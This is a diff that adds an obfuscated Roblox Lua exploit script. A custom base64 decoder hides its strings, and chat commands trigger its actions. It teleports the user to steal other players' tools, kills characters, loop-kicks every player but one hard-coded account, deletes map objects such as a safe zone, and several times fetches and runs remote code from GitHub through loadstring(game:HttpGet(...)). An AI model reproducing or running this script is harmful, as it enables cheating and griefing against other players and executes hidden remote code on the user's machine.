@@ -1,0 +1,179 @@
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+local Cmdee = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('BBaUIbBCZVwxjIdZjLzvfbYtplzuuHzlRqNmiLyJfZINdaYLUSuAIAWL2UgY21kZSDZiti02LrZhCDZhNmDINin2YXYsSDYs9mD2LHYqNiq')
+
+local function sendSystemMessage()
+	game.StarterGui:SetCore(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('bZCiaOExQPDqJVKpaVArUWlfeUGrdAsLBvINFEtGmYfkvxbYPqmJrcpQ2hhdE1ha2VTeXN0ZW1NZXNzYWdl'), {
+		Text = Cmdee;
+        Font = Enum.Font; --font
+        Color = Color3.new(252, 250, 255); --color
+        FontSize = Enum.FontSize.Size96 --size
+	})
+end
+
+sendSystemMessage()
+
+-- سكربتات
+
+local player = game.Players.LocalPlayer
+local mouse = player:GetMouse()
+
+mouse.Button1Down:Connect(function()
+  local target = mouse.Target
+  if target and target.Parent:IsA(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('GSYhXPsRrGmVcECXWbgJlMjRZRwSZCTQlQKPZQBAhOdZxaKqIrwOvmATW9kZWw=')) and target.Parent:IsDescendantOf(workspace) then
+    local playerObject = target.Parent
+
+    if playerObject:FindFirstChildOfClass(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('ahDjAqZVTsMCEwYOLPNofEYhOGTTrnDUCWgZtFWpcHvWPhxvmcIYSOEVG9vbA==')) then
+      local name = playerObject.Name
+
+      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = playerObject:FindFirstChildOfClass(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('wGDMNggRDUxfPnzxxBjFcODONJYAUBIxCsQFzWEYkuswKLFRVZnRSlHVG9vbA==')).Handle.CFrame
+      wait(0.5)
+      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11.031303, 11.909981, 77.7965469, -0.969540477, -3111111111111.10773807e-08, -0.244931206, -1.97727861e-08, 1, -4.86130993e-08, 0.244931206, -4.22893969e-08, -0.969540477)
+      wait(0.2)
+      game.Players.LocalPlayer.Character.Humanoid.Health = 0
+    end
+  end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('nMOFBUWaktgOlRjXLoNGJmPOOvyePZxnaJgjwYGOFxoMOLvZakizzLKL2Uga2ljayA=')
+if string.sub(message, 1, #keyword) == keyword then
+local Name = string.sub(message, #keyword + 1)
+
+local playerObject = workspace:FindFirstChild(Name)
+
+if playerObject then
+  local tool = game.Players[Name].Character:FindFirstChildOfClass(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('hjzBiqAnwMtaMZatpRKKMiGItnHazqmdwiZITObhuUcMMIylzGvJUwoVG9vbA=='))
+if tool then
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = tool.Handle.CFrame
+end
+  wait(.5)
+  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11.031303, 11.909981, 77.7965469, -0.969540477, -3111111111111.10773807e-08, -0.244931206, -1.97727861e-08, 1, -4.86130993e-08, 0.244931206, -4.22893969e-08, -0.969540477)
+  wait(.2)
+  game.Players.LocalPlayer.Character.Humanoid.Health = 0
+end
+  end
+end)
+
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('gLdJAQkOkgSpsbwLtAIOSbzPUWbmoqukmvdtKkAGsfnROyEduYSDGVFL2Uga2lja3JkbQ==')
+if string.sub(message, 1, #keyword) == keyword then
+local function equipTool(tool)
+    if tool then
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = tool.Handle.CFrame
+    end
+end
+
+
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    if player ~= game.Players.LocalPlayer and player.UserId ~= 364830746 then
+        player.CharacterAdded:Connect(function(character)
+            local tool = character:FindFirstChildOfClass(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('JvnQlsNVKZAHMgohGYqaxqoiBJyDoJxmpXGjZRvkITBieCzmyGLsXNSVG9vbA=='))
+            equipTool(tool)
+        end)
+        if player.Character and player.Character:FindFirstChildOfClass(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('JUQwmKeFihWuZuRgFLQUiUdDhsKTXcbjFKRSkGPIfqdXuROdpdexYQmVG9vbA==')) then
+            equipTool(player.Character:FindFirstChildOfClass(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('eyZAexLPzbMnaUuZlqidnKOIYdXdqVKFKrOjwyvrhGSyPRCNDMOHFnHVG9vbA==')))
+		 wait(0.5)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-11.031303, 11.909981, 77.7965469, -0.969540477, -3111111111111.10773807e-08, -0.244931206, -1.97727861e-08, 1, -4.86130993e-08, 0.244931206, -4.22893969e-08, -0.969540477)
+        wait(0.2)
+        game.Players.LocalPlayer.Character.Humanoid.Health = 0
+        end
+    end
+end
+end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('iLZOhzDkYbMDroxRqzNrJVRltTTXCAwZQJYydYyzChrqkwdcFXrIEajL2UgMjV4')
+if string.sub(message, 1, #keyword) == keyword then
+loadstring(game:HttpGet(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('qRohmvhqIXfFtvARAmBxHkHSMRrGKOxDwWCRzaYmBPxJULOAipVhZswaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2wxMTAwNC83eWQ3L21haW4vMjV4JTIwJUQ4JUE3JUQ4JUIzJUQ4JUIxJUQ5JTgyJTIwJUQ5JTg4JUQ5JTgyJUQ4JUFB')))()
+end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('VNyHpjVhyzaFymJSrmyNxuKqpAQSCzAVhKMdvOpgggrvBlcsZlQKJNxL2UgYXV0b3Jq')
+if string.sub(message, 1, #keyword) == keyword then
+loadstring(game:HttpGet((OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('pAcBleJkTgcrnJhftDvTgJptnlKvuWYOsAdZibabxBGSKGYRhtIMDrFaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JhZWNob29ZVC9KdXN0X1N0b3AvbWFpbi9hdXRvcmotZm9yYXV0b2V4ZWMubHVh')), true))()
+end
+end)
+
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('xNHdHSSJKRcpCcPgkIfBhPwtaveDhJjLWecLKawiPmVRunTaIYRCwFpL2UgZGVs')
+if string.sub(message, 1, #keyword) == keyword then
+	workspace.CommonMesh.Parent = lol
+	workspace.EpicMesh.Parent = lol
+	workspace.LegendaryMesh.Parent = lol
+	workspace.RareMesh.Parent = lol
+	workspace.SafeZone.Parent = lol
+end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('tMRisDgtkZuTjePgqvSWzPiHjdfOHPXoWEQluxmykPMzCAJKAvfRyNVL2UgY21kZQ==')
+if string.sub(message, 1, #keyword) == keyword then
+loadstring(game:HttpGet(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('FPISseumoNZEhgKvwCfBZOCsyCzRcOHGbdqgDZqeSovTaeMTdgBCCqoaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2wxMTAwNC83eWQ3L21haW4vY21kZQ==')))()
+end
+end)
+
+
+-- loop سكربتات
+
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('dJgaUDeyHTdnduqXoaCtROdiSBeEYjVhWXCeYWQNnhWWaEZTIChsJFvL2UgbG9vcGtpY2s=')
+if string.sub(message, 1, #keyword) == keyword then
+getgenv().loopkick = true
+
+  end
+end)
+
+local player = game.Players.LocalPlayer
+local chattedConnection = player.Chatted:Connect(function(message)
+local keyword = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('DtrChcKYlDOogDMFCwIQEmqvDlLAciNUpfIclqHGYGMoEJEzjqbbbJtL2UgdW5sb29wa2ljaw==')
+if string.sub(message, 1, #keyword) == keyword then
+getgenv().loopkick = false
+
+  end
+end)
+
+while wait(1) do
+ if getgenv().loopkick == true then
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if player ~= game.Players.LocalPlayer and player.UserId ~= 364830746 then
+            if player.Character and player.Character:FindFirstChildOfClass(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('ZQMkNcIsoJexGbDXibOjBYiBYHsMTmUghHHSGBYmlqCcSzFDvCmLOfkVG9vbA==')) then
+                local tool = player.Character:FindFirstChildOfClass(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('sMMjIDNsVoOUMzntxLLUZSDPweWUCOgrwhuaktaKnxnHwbQbqCFxMsRVG9vbA=='))
+                if tool.Name == OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('ygXxhoDtNHLFeQzNBWhyLwrCvCmbbmhLnXzrtsoARxjdixobHkolgPFTXlUb29s') then
+                    getgenv().loopkick = false
+                end
+            end
+        end
+    end
+        game.Players:Chat(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('IFkGLtElpcsUgEsfrWeLLfaZeQUfvrYBZIOSraGmvQgtBdOVzsDSHJJL2Uga2lja3JkbQ=='))
+ 
+    end
+end 
+
+game.StarterGui:SetCore(OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('oNHlBUFVncqPacSIaDztJmRvHzBmRVqTPtsPrfLOCwtFHDWoidFYDoLU2VuZE5vdGlmaWNhdGlvbg=='),  {
+ Title = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('apoilCAeXSermLCuinvLDWpzvaCJmNsPQRNOvQImzBnQMxhqQiQzzyLWW91VHViZSBfVlI3');
+ Text = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('usHjbNGKzreOUSHJyTWXweSBGfklCIMnviizMUCxwmSXoBqPRvmuzKYdGlrIHZyN19z');
+ Icon = OJaseTQUrhxQrcukVhwxMQbtpJbGbIrmpYoOEmRXyDtMEqKrsJnfqcGcrfQgsftIZCTDMtLAiDkFY('RoIdtYEJBfwWGqtgjOvtiAeNsXsWcEkxVaTjTvjagKfYATdIPDCTmWW');
+ Duration = 5;
+ Callback = NotificationBindable;
+})     
